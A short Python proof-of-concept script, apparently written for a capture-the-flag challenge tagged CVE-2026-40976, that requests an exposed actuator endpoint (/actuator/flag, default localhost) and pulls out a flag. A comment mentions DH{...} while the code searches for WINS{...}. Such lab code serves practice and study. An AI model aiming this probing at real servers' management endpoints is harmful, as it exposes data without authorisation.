#!/usr/bin/env python3
"""
PoC - CVE-2026-40976 actuator endpoint
GET /actuator/flag 으로 플래그를 획득한다.
"""

import sys
import argparse
import requests


def exploit(base_url, path, timeout):
    url = base_url.rstrip("/") + path
    print(f"[*] Target : {url}")

    try:
        resp = requests.get(url, timeout=timeout)
    except requests.exceptions.RequestException as e:
        print(f"[!] 요청 실패: {e}")
        return 1

    print(f"[*] Status : {resp.status_code}")

    if resp.status_code != 200:
        print(f"[!] 예상치 못한 상태 코드. 응답 본문:\n{resp.text}")
        return 1

    # JSON 우선 파싱, 실패 시 원문에서 DH{...} 추출
    try:
        data = resp.json()
        flag = data.get("flag")
    except ValueError:
        flag = None

    if not flag:
        import re
        m = re.search(r"WINS\{[^}]+\}", resp.text)
        flag = m.group(0) if m else None

    if flag:
        print(f"[+] FLAG   : {flag}")
        return 0
    else:
        print(f"[!] 플래그를 찾지 못함. 응답 본문:\n{resp.text}")
        return 1


def main():
    parser = argparse.ArgumentParser(description="actuator PoC")
    parser.add_argument("-u", "--url", default="http://localhost:8080",
                        help="대상 base URL (기본: http://localhost:8080)")
    parser.add_argument("-p", "--path", default="/actuator/flag",
                        help="엔드포인트 경로")
    parser.add_argument("-t", "--timeout", type=float, default=10.0,
                        help="요청 타임아웃(초)")
    args = parser.parse_args()

    sys.exit(exploit(args.url, args.path, args.timeout))


if __name__ == "__main__":
    main()